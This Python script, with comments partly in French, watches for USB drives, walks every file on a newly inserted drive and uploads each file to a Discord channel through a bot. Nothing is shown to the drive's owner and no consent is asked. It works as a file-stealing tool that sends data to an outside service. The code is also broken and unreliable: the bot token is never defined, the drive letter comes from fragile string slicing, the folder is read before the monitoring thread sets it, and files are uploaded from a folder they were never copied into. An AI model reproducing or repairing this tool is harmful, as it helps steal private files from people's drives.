import subprocess, os
import shutil
import threading
import time
import discord
from discord.ext import commands

class USB_TRANSFER:
    def __init__(self):
        self.lecteur = None
        self.discord_channel_id = "YOUR_DISCORD_CHANNEL_ID"

    def check_usb(self):
        try:
            output = subprocess.check_output("wmic logicaldisk get caption, drivetype", shell=True)
            data = str(output)
            x = data.find("2")
            if not x == -1:
                get = data.find("2")
                cvt = int(get)
                divise = cvt - 9
                getD = data[divise:cvt]
                self.lecteur = getD[0:2]
                print(f"New USB device detected: {self.lecteur}")
        except Exception as e:
            print(f"Error checking USB devices: {str(e)}")

    def monitor_usb(self):
        while True:
            self.check_usb()
            time.sleep(60)  # Check every minute

    def send_file_to_discord(self, file_path):
        bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
        
        @bot.event
        async def on_ready():
            channel = bot.get_channel(self.discord_channel_id)
            with open(file_path, 'rb') as f:
                await channel.send(file=f.read())

        bot.run(self.discord_bot_token)

    def main(self):
        try:
            print("Starting USB monitoring...")
            
            # Start the monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_usb)
            monitor_thread.daemon = True
            monitor_thread.start()

            # Wait for the monitoring thread to start
            time.sleep(1)

            source_Folder = self.lecteur
            target_Folder = 'C:\\target_Folder'

            try:
                while True:
                    for dirs, subdirs, files in os.walk(source_Folder):
                        for file in files:
                            print(f"Processing file: {file}")
                            filename = os.path.join(source_Folder, dirs, file)
                            if os.path.exists(filename):
                                print(f"Coping file: {filename} to {target_Folder}")
                                # Envoi du fichier vers Discord
                                self.send_file_to_discord(os.path.join(target_Folder, file))
                    time.sleep(300)  # Wait for 5 minutes between scans
            except KeyboardInterrupt:
                print("\nStopping USB monitoring...")
            except Exception as e:
                print(f"An unexpected error occurred: {str(e)}")

        except Exception as e :
            print("no USB found")

if __name__ == "__main__":
    usb_transfer = USB_TRANSFER()
    usb_transfer.main()
